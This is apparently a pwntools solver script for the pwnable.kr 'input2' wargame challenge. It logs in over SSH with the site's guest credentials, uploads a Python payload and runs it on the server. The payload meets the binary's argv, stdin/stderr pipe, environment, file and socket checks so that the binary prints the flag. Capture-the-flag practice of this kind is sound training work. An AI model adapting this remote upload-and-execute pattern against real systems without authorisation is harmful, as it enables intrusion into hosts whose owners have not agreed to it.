from pwn import *
import time

# Connection details
user = 'input2'
host = 'pwnable.kr'
port = 2222
password = 'guest'

# Python Solver Payload (will run on server)
python_payload = r"""
import os
import socket
import time
import sys

# Paths
flag_link = "flag"
target_bin = "/home/input2/input2"

# 0. Setup Environment
# Symlink flag because target calls "cat flag" in CWD
if not os.path.exists(flag_link):
    try:
        os.symlink("/home/input2/flag", flag_link)
    except:
        pass

# 4. Prepare FILE (Stage 4)
# Write to file named "\x0a"
with open("\x0a", "wb") as f:
    f.write(b"\x00\x00\x00\x00")

# Pipes for Stage 2 (STDIO)
# r1/w1 for stdin, r2/w2 for stderr
r1, w1 = os.pipe()
r2, w2 = os.pipe()

pid = os.fork()

if pid == 0:
    # --- CHILD (Target) ---
    
    # Redirect Stdin
    os.dup2(r1, 0)
    os.close(r1)
    os.close(w1)
    
    # Redirect Stderr
    os.dup2(r2, 2)
    os.close(r2)
    os.close(w2)
    
    # 3. Environment (Stage 3)
    # getenv("\xde\xad\xbe\xef") == "\xca\xfe\xba\xbe"
    # Note: os.execve takes env dictionary. Keys/Values must be bytes or str.
    # The target checks specifically for these bytes.
    env = {b"\xde\xad\xbe\xef": b"\xca\xfe\xba\xbe"}
    
    # 1. ARGV (Stage 1)
    # argc must be 100.
    # argv[0] is prog name. argv[1]..argv[99].
    argv = [target_bin] + ["A"] * 99
    
    # Stage 1 Checks:
    # strcmp(argv['A'], "\x00") -> Expects empty string (matches \x00 terminator in C)
    argv[ord('A')] = ""
    
    # strcmp(argv['B'], "\x20\x0a\x0d")
    argv[ord('B')] = "\x20\x0a\x0d"
    
    # Stage 5 Check:
    # argv['C'] is port
    argv[ord('C')] = "5555"
    
    try:
        os.execve(target_bin, argv, env)
    except Exception as e:
        sys.stderr.write(f"Execve failed: {e}\n")
        exit(1)

else:
    # --- PARENT (Solver) ---
    os.close(r1)
    os.close(r2)
    
    # Stage 2: Write to pipes
    os.write(w1, b"\x00\x0a\x00\xff")
    os.write(w2, b"\x00\x0a\x02\xff")
    # Close write ends
    os.close(w1)
    os.close(w2)
    
    # Stage 5: Network
    print("Waiting for socket...")
    time.sleep(2)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 5555))
        s.send(b"\xde\xad\xbe\xef")
        s.close()
        print("Payload sent.")
    except Exception as e:
        print(f"Network error: {e}")
    
    # Wait for child
    os.wait()
"""

# Connection
s = ssh(user=user, host=host, port=port, password=password)

# Workspace
workspace = "/tmp/solve_input_rommel_py"
log.info(f"Creating workspace {workspace}...")
s.process(['mkdir', '-p', workspace]).recvall()

# Upload Payload
log.info("Uploading python payload...")
local_path = "/tmp/payload.py"
with open(local_path, "w") as f:
    f.write(python_payload)
s.put(local_path, remote=f"{workspace}/payload.py")

# Run
log.info("Running payload on server...")
# We use python3 on the server to run the payload
p = s.process(['sh', '-c', f"cd {workspace} && python3 payload.py"], cwd=workspace)

p.interactive()
